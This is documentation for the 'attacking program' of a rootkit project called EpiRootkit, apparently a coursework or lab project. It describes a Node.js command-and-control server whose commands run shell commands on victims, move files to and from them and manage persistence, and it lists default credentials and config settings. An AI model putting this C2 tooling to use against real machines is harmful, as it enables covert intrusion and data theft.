---
title: "Overview"
description: "C2 server architecture and capabilities"
icon: "dashboard"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 31
---

# Attacking Program Overview

Professional C2 (Command & Control) server built with Node.js providing CLI interface for managing EpiRootkit connections.

## Quick Start

```bash
# Install dependencies and start
cd attacking_program
pnpm install
pnpm start

# Server output
# ✓ Server started on port 4444
# ✓ Web interface started on port 3000
```

## Architecture

### Core Components
- **CLI Interface**: Vorpal.js-based interactive command system
- **C2 Server**: TCP server handling rootkit connections on port 4444
- **Web Interface**: Express.js REST API with Socket.IO on port 3000
- **Client Manager**: Connection lifecycle and authentication management
- **Event System**: Real-time event handling and logging

### Technology Stack
- **Runtime**: Node.js 18+ with pnpm package manager
- **CLI Framework**: Vorpal.js for interactive commands
- **Web Server**: Express.js with Socket.IO for real-time updates
- **Encryption**: XOR cipher implementation (configurable)

## Core Features

### Client Management
```bash
ls                          # List connected clients
auth <client> <password>    # Authenticate with SHA-512 verification
status <client>             # Get comprehensive rootkit status
keepalive <client>          # Check connection health
```

### Remote Operations
```bash
exec <client> <command>                     # Execute shell commands
upload <client> <local> [remote]            # Upload files to victim
download <client> <remote> [local]          # Download files from victim
```

### Configuration Management
```bash
config <client>             # Interactive configuration menu
persist <client> [action]   # Manage persistence mechanisms
```

## Authentication System

**SHA-512 Password Authentication:**
1. C2 sends plaintext password via `auth` command
2. Rootkit hashes password and compares with stored hash
3. Session established with 1-hour timeout
4. Rate limiting: 5 attempts per 60 seconds

**Default Credentials:**
- Password: `password`
- Hash: `b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86`

## Configuration

### Server Settings (`config.env`)
```bash
C2_PORT=4444                    # C2 server port
WEB_PORT=3000                   # Web interface port
ENCRYPTION_KEY=0123456789abcdef0123456789abcdef  # 32-char hex key
ENABLE_ENCRYPTION=true          # XOR encryption toggle
PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
```


## Security Features

- **Authentication**: SHA-512 hashing with brute force protection
- **Encryption**: Optional XOR cipher for traffic obfuscation
- **Session Management**: Automatic timeout and cleanup
- **Access Control**: Commands require authentication
- **Connection Health**: Automatic stale client detection